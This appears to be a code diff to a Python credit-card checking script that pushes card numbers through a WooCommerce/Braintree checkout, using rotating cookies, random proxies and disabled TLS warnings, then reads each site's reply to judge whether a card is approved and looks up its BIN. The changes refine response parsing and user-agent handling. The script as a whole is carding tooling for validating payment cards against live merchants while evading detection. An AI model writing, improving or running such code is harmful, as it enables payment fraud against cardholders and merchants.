@@ -5,8 +5,13 @@ from bs4 import BeautifulSoup
 from user_agent import generate_user_agent
 import time
 import json
+from datetime import datetime
 import random
 import urllib3
+import sys
+import io
+import codecs
+import os
 import glob
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -15,8 +20,10 @@ SELECTED_COOKIE_PAIR = None
 
 def discover_cookie_pairs():
     try:
-        files1 = glob.glob('cookies_*-1.txt')
-        files2 = glob.glob('cookies_*-2.txt')
+        pattern1 = 'cookies_*-1.txt'
+        pattern2 = 'cookies_*-2.txt'
+        files1 = glob.glob(pattern1)
+        files2 = glob.glob(pattern2)
         pairs = []
         for file1 in files1:
             pair_id = file1.replace('cookies_', '').replace('-1.txt', '')
@@ -68,6 +75,8 @@ def get_cookies_2():
     if SELECTED_COOKIE_PAIR is None:
         select_new_cookie_pair_silent()
     return read_cookies_from_file(SELECTED_COOKIE_PAIR['file2'])
+
+user = generate_user_agent()
 
 def get_headers():
     domain_url = get_domain_url()
@@ -248,7 +257,7 @@ def check_card(cc_line):
             'authorization': f'Bearer {au}',
             'braintree-version': '2018-05-10',
             'content-type': 'application/json',
-            'user-agent': generate_user_agent()
+            'user-agent': user
         }
 
         proxy = get_random_proxy()
@@ -290,13 +299,25 @@ def check_card(cc_line):
         elapsed_time = time.time() - start_time
         soup = BeautifulSoup(response2.text, 'html.parser')
         error_div = soup.find('div', class_='woocommerce-notices-wrapper')
-        # --- Best Response Extraction Logic ---
+
+        # ---- BEST PRACTICE: Show site message or always fallback to raw/error ----
         if error_div:
             message = error_div.get_text(strip=True)
         else:
-            message = soup.get_text(separator=' ', strip=True)
-            if not message or len(message) < 5:
-                message = f"[Raw] {response2.text[:200]} [HTTP {response2.status_code}]"
+            # Try common error/notice/message classes
+            notify = (
+                soup.find(class_="woocommerce-error")
+                or soup.find(class_="woocommerce-message")
+                or soup.find("div", {"class": "alert"})
+            )
+            if notify:
+                message = notify.get_text(strip=True)
+            else:
+                raw_preview = response2.text.strip().replace('\n', '')[:300]
+                if raw_preview:
+                    message = f"[RAW HTML Preview]: {raw_preview}"
+                else:
+                    message = "No response from site (empty)"
 
         status, _, approved = check_status(message)
         bin_info = get_bin_info(n[:6]) or {}
@@ -323,5 +344,3 @@ def check_card(cc_line):
 
     except Exception as e:
         return f"❌ Error: {str(e)}"
-
-# END OF FILE
